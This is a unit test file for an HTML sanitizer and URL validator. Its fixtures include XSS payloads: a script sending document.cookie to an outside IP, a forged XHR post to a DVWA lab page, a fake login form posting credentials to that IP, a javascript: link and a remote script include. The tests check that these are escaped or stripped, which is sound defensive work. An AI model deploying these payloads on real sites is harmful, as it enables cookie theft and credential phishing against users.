import { isURLValid, sanitizeHTML } from './sanitizeHTML';

/** not allowed */
const script = '<script src=""></script>';
const script2 = `<script>new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>`;
const xhrScript = `<script>
  var xhr = new XMLHttpRequest();
  xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
  xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
  xhr.send('txtName=xss&mtxMessage=xss&btnSign=Sign+Guestbook');
  </script>`;
const aClick = '<a onClick="() => console.log("hello world")"></a>';
const aClickLang =
  '<a lang="en-us" onClick="() => console.log("hello world")"></a>';
const login = `http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<h3>Please login to proceed</h3> <form action=http://192.168.149.128>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br></form></h3>`;
const aScript = `<a href="javascript:alert(8007)">Click me</a>`;
const queryString = `http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script src="http://192.168.149.128/xss.js">`;

/** allowed */
const a = '<a href="helloworld.com">Hello world</a>';
const aLang = '<a lang="en-us"></a>';

it('should escape script tags, retain child text, and strip attributes', () => {
  expect(sanitizeHTML(script)).toBe('&lt;script&gt;&lt;/script&gt;');
  expect(sanitizeHTML(script2)).toBe(
    '&lt;script&gt;new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;&lt;/script&gt;'
  );
  expect(sanitizeHTML(xhrScript)).toBe(
    `&lt;script&gt;
  var xhr = new XMLHttpRequest();
  xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
  xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
  xhr.send('txtName=xss&amp;mtxMessage=xss&amp;btnSign=Sign+Guestbook');
  &lt;/script&gt;`
  );
});

it('should escape unwanted blacklisted tags', () => {
  expect(sanitizeHTML(login)).not.toMatch(/<form|<input/);
  expect(sanitizeHTML(aScript)).toBe(`<span>Click me</span>`);
});

it('should not allow query string attacks', () => {
  expect(sanitizeHTML(queryString)).toBe(
    'http://localhost:81/DVWA/vulnerabilities/xss_r/?name=&lt;script&gt;&lt;/script&gt;'
  );
});

it('should only allow whitelisted HTML attributes', () => {
  expect(sanitizeHTML(aClick)).toBe('<a></a>');
  expect(sanitizeHTML(aLang)).toBe(aLang);
  expect(sanitizeHTML(aClickLang)).toBe(aLang);
  expect(sanitizeHTML(a)).toBe(a);
});

describe('isURLValid', () => {
  it('returns `false` for long URLS', () => {
    let url = 'https://';
    for (let i = 0; i < 2001; i++) {
      url += 'a';
    }
    url += '.com';
    expect(isURLValid(url)).toBe(false);
  });
  it('returns `false` for javascript URLs', () => {
    expect(isURLValid('javascript:void')).toBe(false);
  });
  it('returns `true` for OK urls', () => {
    expect(isURLValid('https://linode.com')).toBe(true);
    expect(isURLValid('https://linode.com?q1=1&q2=2')).toBe(true);
    expect(isURLValid('linode.com')).toBe(true);
    expect(isURLValid('mailto:linode@linode.com')).toBe(true);
  });
});
